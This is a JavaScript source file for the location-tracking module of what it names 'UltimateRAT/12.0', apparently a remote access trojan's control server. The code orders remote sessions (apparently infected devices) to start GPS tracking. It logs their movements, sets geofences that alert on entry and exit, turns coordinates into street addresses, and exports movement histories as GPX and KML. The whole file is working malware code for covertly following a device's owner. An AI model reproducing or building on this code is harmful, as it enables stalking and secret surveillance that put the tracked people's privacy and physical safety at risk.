/**
 * Location Module - Complete Location Tracking System
 * Features: GPS Tracking, Geo-fencing, Location History, Map Integration, Reverse Geocoding
 */

const EventEmitter = require('events');
const fs = require('fs-extra');
const path = require('path');
const crypto = require('crypto');
const moment = require('moment');
const axios = require('axios');
const config = require('../config');

class LocationModule extends EventEmitter {
    constructor(sessionManager) {
        super();
        this.sessionManager = sessionManager;
        this.trackingSessions = new Map(); // sessionId -> tracking state
        this.geoFences = new Map(); // sessionId -> geo-fences
        this.locationHistory = new Map(); // sessionId -> location history
        this.routes = new Map(); // sessionId -> route tracking
        this.lastLocations = new Map(); // sessionId -> last known location
        
        // Tracking options
        this.trackingOptions = {
            interval: 5000, // 5 seconds
            minDistance: 10, // 10 meters
            accuracy: 'high',
            providers: ['gps', 'network', 'passive']
        };
        
        // Geocoding cache
        this.geocodeCache = new Map();
        
        // Map tile cache
        this.mapCache = new Map();
        
        // Initialize directories
        this.initDirectories();
        
        // Start auto-cleanup
        this.startCleanupInterval();
    }
    
    initDirectories() {
        this.locationsDir = path.join(__dirname, '../../locations');
        this.historyDir = path.join(this.locationsDir, 'history');
        this.routesDir = path.join(this.locationsDir, 'routes');
        this.mapsDir = path.join(this.locationsDir, 'maps');
        fs.ensureDirSync(this.locationsDir);
        fs.ensureDirSync(this.historyDir);
        fs.ensureDirSync(this.routesDir);
        fs.ensureDirSync(this.mapsDir);
    }
    
    // ==================== LOCATION TRACKING ====================
    
    async startTracking(sessionId, options = {}) {
        const session = this.sessionManager.getSession(sessionId);
        if (!session) {
            throw new Error('Session not found');
        }
        
        if (this.trackingSessions.has(sessionId)) {
            throw new Error('Already tracking');
        }
        
        const trackingId = crypto.randomBytes(8).toString('hex');
        const startTime = Date.now();
        
        const trackingOptions = {
            ...this.trackingOptions,
            ...options,
            interval: options.interval || this.trackingOptions.interval,
            minDistance: options.minDistance || this.trackingOptions.minDistance,
            accuracy: options.accuracy || this.trackingOptions.accuracy
        };
        
        try {
            // Send start tracking command
            await this.sessionManager.executeCommand(sessionId, 'start_location_tracking', trackingOptions, 10000);
            
            const trackingState = {
                id: trackingId,
                sessionId: sessionId,
                startTime: startTime,
                options: trackingOptions,
                status: 'tracking',
                locations: [],
                distance: 0,
                speed: 0,
                maxSpeed: 0,
                avgSpeed: 0,
                minAltitude: Infinity,
                maxAltitude: -Infinity
            };
            
            this.trackingSessions.set(sessionId, trackingState);
            this.emit('tracking_started', sessionId, trackingState);
            
            return trackingState;
            
        } catch (error) {
            console.error(`Failed to start tracking for session ${sessionId}:`, error);
            throw error;
        }
    }
    
    async stopTracking(sessionId) {
        const trackingState = this.trackingSessions.get(sessionId);
        if (!trackingState) {
            throw new Error('No active tracking');
        }
        
        try {
            await this.sessionManager.executeCommand(sessionId, 'stop_location_tracking', {}, 10000);
            
            trackingState.status = 'stopped';
            trackingState.endTime = Date.now();
            trackingState.duration = (trackingState.endTime - trackingState.startTime) / 1000;
            
            // Calculate statistics
            if (trackingState.locations.length > 0) {
                trackingState.avgSpeed = trackingState.distance / (trackingState.duration / 3600);
            }
            
            // Save history
            await this.saveLocationHistory(sessionId, trackingState);
            
            this.emit('tracking_stopped', sessionId, trackingState);
            
            return trackingState;
            
        } catch (error) {
            console.error(`Failed to stop tracking for session ${sessionId}:`, error);
            throw error;
            
        } finally {
            this.trackingSessions.delete(sessionId);
        }
    }
    
    // ==================== LOCATION UPDATE ====================
    
    async updateLocation(sessionId, locationData) {
        const session = this.sessionManager.getSession(sessionId);
        if (!session) {
            return;
        }
        
        const timestamp = Date.now();
        const location = {
            id: crypto.randomBytes(8).toString('hex'),
            sessionId: sessionId,
            latitude: locationData.latitude,
            longitude: locationData.longitude,
            altitude: locationData.altitude || 0,
            accuracy: locationData.accuracy || 0,
            speed: locationData.speed || 0,
            bearing: locationData.bearing || 0,
            provider: locationData.provider || 'unknown',
            timestamp: timestamp,
            timestampISO: new Date(timestamp).toISOString()
        };
        
        // Update last location
        this.lastLocations.set(sessionId, location);
        
        // Update session in database
        await this.sessionManager.updateSessionLocation(
            sessionId,
            location.latitude,
            location.longitude,
            location.altitude,
            location.accuracy
        );
        
        // Add to tracking if active
        const trackingState = this.trackingSessions.get(sessionId);
        if (trackingState && trackingState.status === 'tracking') {
            const lastLocation = trackingState.locations[trackingState.locations.length - 1];
            
            // Check if we should record this location (based on minDistance)
            if (!lastLocation || this.calculateDistance(lastLocation, location) >= trackingState.options.minDistance) {
                trackingState.locations.push(location);
                
                // Update statistics
                if (lastLocation) {
                    const distance = this.calculateDistance(lastLocation, location);
                    trackingState.distance += distance;
                    trackingState.speed = location.speed;
                    trackingState.maxSpeed = Math.max(trackingState.maxSpeed, location.speed);
                }
                
                trackingState.minAltitude = Math.min(trackingState.minAltitude, location.altitude);
                trackingState.maxAltitude = Math.max(trackingState.maxAltitude, location.altitude);
                
                // Emit location update
                this.emit('location_updated', sessionId, location, trackingState);
                
                // Check geo-fences
                await this.checkGeoFences(sessionId, location);
            }
        }
        
        // Save to history
        await this.addToHistory(sessionId, location);
        
        return location;
    }
    
    // ==================== GEO-FENCING ====================
    
    async addGeoFence(sessionId, name, centerLat, centerLng, radius, options = {}) {
        const fenceId = crypto.randomBytes(8).toString('hex');
        
        const geoFence = {
            id: fenceId,
            name: name,
            center: { lat: centerLat, lng: centerLng },
            radius: radius, // meters
            options: {
                enter: options.enter !== false,
                exit: options.exit !== false,
                dwell: options.dwell || 0,
                once: options.once || false,
                ...options
            },
            createdAt: Date.now(),
            status: 'inactive'
        };
        
        if (!this.geoFences.has(sessionId)) {
            this.geoFences.set(sessionId, []);
        }
        
        this.geoFences.get(sessionId).push(geoFence);
        
        // Check if already inside
        const lastLocation = this.lastLocations.get(sessionId);
        if (lastLocation) {
            const distance = this.calculateDistance(
                { latitude: lastLocation.latitude, longitude: lastLocation.longitude },
                { latitude: centerLat, longitude: centerLng }
            );
            
            if (distance <= radius) {
                geoFence.status = 'inside';
                this.emit('geo_fence_entered', sessionId, geoFence, lastLocation);
            }
        }
        
        this.emit('geo_fence_added', sessionId, geoFence);
        
        return geoFence;
    }
    
    async removeGeoFence(sessionId, fenceId) {
        const fences = this.geoFences.get(sessionId);
        if (!fences) return false;
        
        const index = fences.findIndex(f => f.id === fenceId);
        if (index !== -1) {
            const fence = fences[index];
            fences.splice(index, 1);
            this.emit('geo_fence_removed', sessionId, fence);
            return true;
        }
        
        return false;
    }
    
    async getGeoFences(sessionId) {
        return this.geoFences.get(sessionId) || [];
    }
    
    async checkGeoFences(sessionId, location) {
        const fences = this.geoFences.get(sessionId);
        if (!fences) return;
        
        for (const fence of fences) {
            const distance = this.calculateDistance(
                { latitude: location.latitude, longitude: location.longitude },
                { latitude: fence.center.lat, longitude: fence.center.lng }
            );
            
            const wasInside = fence.status === 'inside';
            const isInside = distance <= fence.radius;
            
            if (isInside && !wasInside) {
                fence.status = 'inside';
                this.emit('geo_fence_entered', sessionId, fence, location);
            } else if (!isInside && wasInside) {
                fence.status = 'outside';
                this.emit('geo_fence_exited', sessionId, fence, location);
            }
        }
    }
    
    // ==================== ROUTE TRACKING ====================
    
    async startRouteTracking(sessionId, routeName) {
        const routeId = crypto.randomBytes(8).toString('hex');
        
        const route = {
            id: routeId,
            name: routeName,
            sessionId: sessionId,
            startTime: Date.now(),
            locations: [],
            distance: 0,
            duration: 0,
            avgSpeed: 0,
            maxSpeed: 0
        };
        
        this.routes.set(routeId, route);
        
        // Start tracking if not already
        if (!this.trackingSessions.has(sessionId)) {
            await this.startTracking(sessionId);
        }
        
        this.emit('route_started', sessionId, route);
        
        return route;
    }
    
    async stopRouteTracking(sessionId, routeId) {
        const route = this.routes.get(routeId);
        if (!route) {
            throw new Error('Route not found');
        }
        
        route.endTime = Date.now();
        route.duration = (route.endTime - route.startTime) / 1000;
        
        if (route.locations.length > 0) {
            route.avgSpeed = route.distance / (route.duration / 3600);
        }
        
        // Save route to file
        await this.saveRoute(sessionId, route);
        
        this.emit('route_stopped', sessionId, route);
        
        return route;
    }
    
    async addToRoute(routeId, location) {
        const route = this.routes.get(routeId);
        if (!route) return;
        
        const lastLocation = route.locations[route.locations.length - 1];
        
        if (lastLocation) {
            const distance = this.calculateDistance(lastLocation, location);
            route.distance += distance;
            route.maxSpeed = Math.max(route.maxSpeed, location.speed);
        }
        
        route.locations.push(location);
        
        this.emit('route_updated', routeId, location);
    }
    
    // ==================== LOCATION HISTORY ====================
    
    async addToHistory(sessionId, location) {
        if (!this.locationHistory.has(sessionId)) {
            this.locationHistory.set(sessionId, []);
        }
        
        const history = this.locationHistory.get(sessionId);
        history.push(location);
        
        // Keep only last 1000 locations in memory
        if (history.length > 1000) {
            const oldLocations = history.splice(0, history.length - 1000);
            // Save old locations to disk
            await this.saveHistoryBatch(sessionId, oldLocations);
        }
        
        // Save to database
        const database = require('../database');
        await database.addLocation(sessionId, location.latitude, location.longitude, location.accuracy);
    }
    
    async getLocationHistory(sessionId, startTime = null, endTime = null, limit = 100) {
        let history = this.locationHistory.get(sessionId) || [];
        
        // Filter by time range
        if (startTime) {
            history = history.filter(l => l.timestamp >= startTime);
        }
        if (endTime) {
            history = history.filter(l => l.timestamp <= endTime);
        }
        
        // Sort by timestamp descending
        history.sort((a, b) => b.timestamp - a.timestamp);
        
        return history.slice(0, limit);
    }
    
    async getLastLocation(sessionId) {
        return this.lastLocations.get(sessionId) || null;
    }
    
    async getLocationStats(sessionId) {
        const history = this.locationHistory.get(sessionId) || [];
        
        if (history.length === 0) {
            return null;
        }
        
        const totalDistance = history.reduce((sum, loc, i) => {
            if (i === 0) return sum;
            return sum + this.calculateDistance(history[i - 1], loc);
        }, 0);
        
        const avgSpeed = totalDistance / ((Date.now() - history[0].timestamp) / 3600000);
        
        return {
            totalLocations: history.length,
            firstSeen: new Date(history[0].timestamp).toISOString(),
            lastSeen: new Date(history[history.length - 1].timestamp).toISOString(),
            totalDistance: totalDistance,
            totalDistanceKm: (totalDistance / 1000).toFixed(2),
            avgSpeed: avgSpeed.toFixed(2),
            maxSpeed: Math.max(...history.map(l => l.speed)).toFixed(2),
            minAltitude: Math.min(...history.map(l => l.altitude)).toFixed(0),
            maxAltitude: Math.max(...history.map(l => l.altitude)).toFixed(0)
        };
    }
    
    // ==================== GEOCODING ====================
    
    async reverseGeocode(latitude, longitude) {
        const cacheKey = `${latitude},${longitude}`;
        
        if (this.geocodeCache.has(cacheKey)) {
            return this.geocodeCache.get(cacheKey);
        }
        
        try {
            // Use OpenStreetMap Nominatim (free, no API key required)
            const response = await axios.get('https://nominatim.openstreetmap.org/reverse', {
                params: {
                    lat: latitude,
                    lon: longitude,
                    format: 'json',
                    addressdetails: 1
                },
                headers: {
                    'User-Agent': 'UltimateRAT/12.0'
                }
            });
            
            const data = response.data;
            const address = data.address || {};
            
            const result = {
                address: data.display_name,
                street: address.road || address.pedestrian || '',
                city: address.city || address.town || address.village || '',
                state: address.state || '',
                country: address.country || '',
                postalCode: address.postcode || '',
                formatted: data.display_name
            };
            
            // Cache for 24 hours
            this.geocodeCache.set(cacheKey, result);
            setTimeout(() => this.geocodeCache.delete(cacheKey), 24 * 60 * 60 * 1000);
            
            return result;
            
        } catch (error) {
            console.error('Reverse geocoding failed:', error.message);
            return {
                address: 'Unknown location',
                formatted: `${latitude}, ${longitude}`
            };
        }
    }
    
    async geocode(address) {
        try {
            const response = await axios.get('https://nominatim.openstreetmap.org/search', {
                params: {
                    q: address,
                    format: 'json',
                    limit: 1
                },
                headers: {
                    'User-Agent': 'UltimateRAT/12.0'
                }
            });
            
            if (response.data && response.data.length > 0) {
                const result = response.data[0];
                return {
                    latitude: parseFloat(result.lat),
                    longitude: parseFloat(result.lon),
                    displayName: result.display_name
                };
            }
            
            return null;
            
        } catch (error) {
            console.error('Geocoding failed:', error.message);
            return null;
        }
    }
    
    // ==================== MAP GENERATION ====================
    
    async generateStaticMap(latitude, longitude, zoom = 15, width = 640, height = 480) {
        const mapId = crypto.randomBytes(8).toString('hex');
        const mapPath = path.join(this.mapsDir, `map_${mapId}.png`);
        
        // Use OpenStreetMap static map service
        const mapUrl = `https://staticmap.openstreetmap.de/staticmap.php?center=${latitude},${longitude}&zoom=${zoom}&size=${width}x${height}&maptype=mapnik&markers=${latitude},${longitude},lightblue1`;
        
        try {
            const response = await axios.get(mapUrl, { responseType: 'arraybuffer' });
            await fs.writeFile(mapPath, response.data);
            
            return {
                id: mapId,
                path: mapPath,
                url: mapUrl,
                latitude: latitude,
                longitude: longitude,
                zoom: zoom,
                width: width,
                height: height
            };
            
        } catch (error) {
            console.error('Map generation failed:', error.message);
            return null;
        }
    }
    
    // ==================== DISTANCE AND CALCULATIONS ====================
    
    calculateDistance(point1, point2) {
        const R = 6371000; // Earth's radius in meters
        const lat1 = point1.latitude * Math.PI / 180;
        const lat2 = point2.latitude * Math.PI / 180;
        const deltaLat = (point2.latitude - point1.latitude) * Math.PI / 180;
        const deltaLng = (point2.longitude - point1.longitude) * Math.PI / 180;
        
        const a = Math.sin(deltaLat / 2) * Math.sin(deltaLat / 2) +
                  Math.cos(lat1) * Math.cos(lat2) *
                  Math.sin(deltaLng / 2) * Math.sin(deltaLng / 2);
        const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
        
        return R * c;
    }
    
    calculateBearing(point1, point2) {
        const lat1 = point1.latitude * Math.PI / 180;
        const lat2 = point2.latitude * Math.PI / 180;
        const lng1 = point1.longitude * Math.PI / 180;
        const lng2 = point2.longitude * Math.PI / 180;
        
        const y = Math.sin(lng2 - lng1) * Math.cos(lat2);
        const x = Math.cos(lat1) * Math.sin(lat2) -
                  Math.sin(lat1) * Math.cos(lat2) * Math.cos(lng2 - lng1);
        
        let bearing = Math.atan2(y, x) * 180 / Math.PI;
        bearing = (bearing + 360) % 360;
        
        return bearing;
    }
    
    // ==================== STORAGE ====================
    
    async saveLocationHistory(sessionId, trackingState) {
        const filename = `tracking_${sessionId}_${trackingState.startTime}.json`;
        const filePath = path.join(this.historyDir, filename);
        
        const data = {
            sessionId: sessionId,
            trackingId: trackingState.id,
            startTime: trackingState.startTime,
            endTime: trackingState.endTime,
            duration: trackingState.duration,
            distance: trackingState.distance,
            avgSpeed: trackingState.avgSpeed,
            maxSpeed: trackingState.maxSpeed,
            locations: trackingState.locations.map(loc => ({
                latitude: loc.latitude,
                longitude: loc.longitude,
                altitude: loc.altitude,
                speed: loc.speed,
                timestamp: loc.timestamp
            }))
        };
        
        await fs.writeJson(filePath, data, { spaces: 2 });
    }
    
    async saveHistoryBatch(sessionId, locations) {
        const filename = `history_${sessionId}_${Date.now()}.json`;
        const filePath = path.join(this.historyDir, filename);
        
        const data = {
            sessionId: sessionId,
            exportedAt: Date.now(),
            count: locations.length,
            locations: locations.map(loc => ({
                latitude: loc.latitude,
                longitude: loc.longitude,
                altitude: loc.altitude,
                speed: loc.speed,
                timestamp: loc.timestamp
            }))
        };
        
        await fs.writeJson(filePath, data, { spaces: 2 });
    }
    
    async saveRoute(sessionId, route) {
        const filename = `route_${sessionId}_${route.id}.json`;
        const filePath = path.join(this.routesDir, filename);
        
        const data = {
            id: route.id,
            name: route.name,
            sessionId: sessionId,
            startTime: route.startTime,
            endTime: route.endTime,
            duration: route.duration,
            distance: route.distance,
            avgSpeed: route.avgSpeed,
            maxSpeed: route.maxSpeed,
            locations: route.locations.map(loc => ({
                latitude: loc.latitude,
                longitude: loc.longitude,
                timestamp: loc.timestamp
            }))
        };
        
        await fs.writeJson(filePath, data, { spaces: 2 });
    }
    
    // ==================== EXPORT ====================
    
    async exportLocationData(sessionId, format = 'json') {
        const history = await this.getLocationHistory(sessionId, null, null, 10000);
        
        if (format === 'gpx') {
            return this.exportToGPX(sessionId, history);
        } else if (format === 'kml') {
            return this.exportToKML(sessionId, history);
        } else {
            const filename = `locations_${sessionId}_${Date.now()}.json`;
            const filePath = path.join(this.locationsDir, filename);
            
            const data = {
                sessionId: sessionId,
                exportedAt: Date.now(),
                totalLocations: history.length,
                locations: history
            };
            
            await fs.writeJson(filePath, data, { spaces: 2 });
            return filePath;
        }
    }
    
    exportToGPX(sessionId, locations) {
        let gpx = '<?xml version="1.0" encoding="UTF-8"?>\n';
        gpx += '<gpx version="1.1" creator="UltimateRAT">\n';
        gpx += '  <trk>\n';
        gpx += `    <name>Location History - ${sessionId}</name>\n`;
        gpx += '    <trkseg>\n';
        
        for (const loc of locations) {
            gpx += `      <trkpt lat="${loc.latitude}" lon="${loc.longitude}">\n`;
            if (loc.altitude) {
                gpx += `        <ele>${loc.altitude}</ele>\n`;
            }
            gpx += `        <time>${new Date(loc.timestamp).toISOString()}</time>\n`;
            gpx += '      </trkpt>\n';
        }
        
        gpx += '    </trkseg>\n';
        gpx += '  </trk>\n';
        gpx += '</gpx>';
        
        return gpx;
    }
    
    exportToKML(sessionId, locations) {
        let kml = '<?xml version="1.0" encoding="UTF-8"?>\n';
        kml += '<kml xmlns="http://www.opengis.net/kml/2.2">\n';
        kml += '  <Document>\n';
        kml += `    <name>Location History - ${sessionId}</name>\n`;
        kml += '    <Placemark>\n';
        kml += '      <name>Track</name>\n';
        kml += '      <LineString>\n';
        kml += '        <coordinates>\n';
        
        for (const loc of locations) {
            kml += `          ${loc.longitude},${loc.latitude},${loc.altitude || 0}\n`;
        }
        
        kml += '        </coordinates>\n';
        kml += '      </LineString>\n';
        kml += '    </Placemark>\n';
        kml += '  </Document>\n';
        kml += '</kml>';
        
        return kml;
    }
    
    // ==================== CLEANUP ====================
    
    startCleanupInterval() {
        setInterval(() => {
            this.cleanup();
        }, 24 * 60 * 60 * 1000); // Every 24 hours
    }
    
    async cleanup() {
        const now = Date.now();
        const maxAge = 30 * 24 * 60 * 60 * 1000; // 30 days
        
        const cleanDir = async (dir) => {
            try {
                const files = await fs.readdir(dir);
                for (const file of files) {
                    const filePath = path.join(dir, file);
                    const stats = await fs.stat(filePath);
                    if (now - stats.mtimeMs > maxAge) {
                        await fs.remove(filePath);
                    }
                }
            } catch (error) {
                console.error('Cleanup error:', error);
            }
        };
        
        await cleanDir(this.historyDir);
        await cleanDir(this.routesDir);
        await cleanDir(this.mapsDir);
        
        // Clear expired geo-fences
        for (const [sessionId, fences] of this.geoFences) {
            const activeFences = fences.filter(f => {
                // Remove fences older than 7 days
                return Date.now() - f.createdAt < 7 * 24 * 60 * 60 * 1000;
            });
            
            if (activeFences.length === 0) {
                this.geoFences.delete(sessionId);
            } else {
                this.geoFences.set(sessionId, activeFences);
            }
        }
        
        this.emit('cleanup_completed');
    }
    
    // ==================== EVENT HANDLERS ====================
    
    onTrackingStarted(callback) {
        this.on('tracking_started', callback);
    }
    
    onTrackingStopped(callback) {
        this.on('tracking_stopped', callback);
    }
    
    onLocationUpdated(callback) {
        this.on('location_updated', callback);
    }
    
    onGeoFenceEntered(callback) {
        this.on('geo_fence_entered', callback);
    }
    
    onGeoFenceExited(callback) {
        this.on('geo_fence_exited', callback);
    }
    
    onRouteStarted(callback) {
        this.on('route_started', callback);
    }
    
    onRouteStopped(callback) {
        this.on('route_stopped', callback);
    }
}

module.exports = LocationModule;
